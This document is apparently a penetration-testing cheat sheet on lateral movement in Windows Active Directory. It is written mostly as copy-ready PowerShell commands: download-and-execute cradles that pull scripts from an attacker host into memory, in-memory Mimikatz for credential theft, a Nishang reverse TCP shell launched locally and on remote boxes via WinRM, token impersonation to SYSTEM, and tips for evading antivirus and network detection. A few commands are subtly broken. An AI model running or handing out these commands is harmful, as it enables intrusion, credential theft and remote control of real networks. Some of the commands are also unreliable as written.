# Pivoting

Pivoting means to move across machines in an environment. This article is about using different techniques to achieve both enumeration of the domain, popping shells, and executing exploits to gain further access. Of course we use the prevalence of Powershell in modern Windows environments to our advantage. We also string together many of these tricks towards efficient and stealthy hacking with a small footprint. Powershhell can do a lot straight into memory without dropping files to disk. BOX01 will be the name of the example box in this article. 10.10.10.10 is also just an example of what would be your local IP address when performing such attacks. Hosting files for download from kali is easy using `python -SimpleHTTPServer 80`

It can also be wise to here set up a local certificate on the server and use HTTPS/443 to avoid detection by network security controls.

Most of these tricks can be employed with only a domain user.

### Downloading/uploading files

Downloading files to boxes willsometimes be necessary, but don't forget that Powershell has the ability to do so much both remotely and execute straight in memory, which is better when you need to be a ninja or bypass things like Antivirus.

This will download a file to the current folder with the same name. An interactive powershell is not necessary for running these commands. They can be ran straight from CMD.

`Powershell.exe -nop -exec bypass -c "IEX (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10/file.txt');"`

This will download to a specific folder and with a specific name as specified in the second argument of the DownloadFile function.

`Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadFile('http://10.10.10.10/PowerView.ps1','C:\tmp\PowerView.ps1');"`

### BloodHound

BloodHound is a tool for mapping out the entire domain graphically.

`Powershell -exec bypass`

`Import-module sharphound.ps1`

`Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing`

### Remoting

Once a domain user is acquired, a lot can be done in terms of remoting. In AD environments, a shell on a box is barely required given a certain set of criteria. One a domain user as been acquired you can use numerous commands to work remotely on boxes you have access to either through domain or local privileges on the remote box. Windows has three ways of providing authenticated access: credentials, hash or tokens. You can see those differnet types of access below:

If file shares are available on a box you can use dir on the path without ever getting prompted for a password given that you already have a shell as the user you want to authenticate as. This means if you somehow got a shell without credentials or a hash, you still have your token to verify your identity to remote services. See command below for a simple verification.

`dir \\BOX01\c$\`

If you however don't have a shell but the credentials of a domain user you can use the somewhat old school [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490994%28v=technet.10%29). This \_will \_prompt you for password, but can be ran without a shell from your own machine.

/netonly : Indicates that the user information specified is for remote access only.

`runas /netonly /FQDN\user cmd.exe`

Run the following command to execute powershell and get on a remote box

`runas /netonly /user:customer\ank powershell`

Using WMIC, check which users have sessions on a remote machine. Local administrator privileges are not necessary to execute this remotely.

```
wmic /node:box01.lab.local path win32_loggedonuser get antecedent
```

Powershell supports WinRM natively, which allows remote execution of commands. Here is how to execute a command on a remote box the current user has access to only using tokens, \(no prompt for password or PTH\). Here the hostname command is used for verification, but you can essentially replace it with any command, like powershell.

`Invoke-Command -ComputerName BOX01 -Scriptblock {hostname}`

If you want to go even harder, you can set up credentials in Powershell. This is something that Empire can do natively with functions like ps\_remoting.

`$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential  -ScriptBlock {hostname};`

### Powerview

Powerview is a super useful set of tools for enumerating a domain. It is part of the much larger toolset of Powersploit, and development is huge on this, so things change all the time.The script and full command list for Powerview can be found here:

[https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

In powerview, there is a super useful function called `Find-LocalAdminAccess` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users. If you need an overview of what groups and users are local admin on every box in the environment you can use `Invoke-EnumerateLocalAdmin`

If you want to go hail mary and fuck shit up you can run every single module in Powerview:

In PowerUp.ps1, add `Invoke-AllChecks` at the bottom of the file. This makes the powershell script execute that function straight into memory after the string has been downloaded. This works for any function inside a powershell-script.

`Powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”`

### Mimikatz

Similar as with powervioew, add a line at the bottom of the ps1 file stating the command you want to execute.  Immediate results straight in the terminal!

```
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```

### Shells

Ninshang shells are the shit [https://github.com/samratashok/nishang/tree/master/Shells](https://github.com/samratashok/nishang/tree/master/Shells)

```
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"
```

We can do the same thing remotely to a box we have access to using WinRM.

```powershell
Invoke-Command -ComputerName BOX01  -Scriptblock {Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClien
t).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"}
```

Should also start looking into using HTTPS shells here to avoid detection.

### Token impersonation

We can do token impersonation completely without Meterpreter, which is really nice. This trick spawns a new thread, but also works in the same thread. However, if you type whoami it might still show the old user. If you however spawn a new process and migrate to that you will have a shell as the account you are impersonating.

Invokes token impersonation on a domain user. If this doesn't work you can try impersonating SYSTEM and then dropping credentials using mimikatz.

`Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"`

`Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`

`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`

### Invoke-Kerberoast

kerberoasting is a technique

[https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)

[https://room362.com/post/2016/kerberoast-pt1/](https://room362.com/post/2016/kerberoast-pt1/)

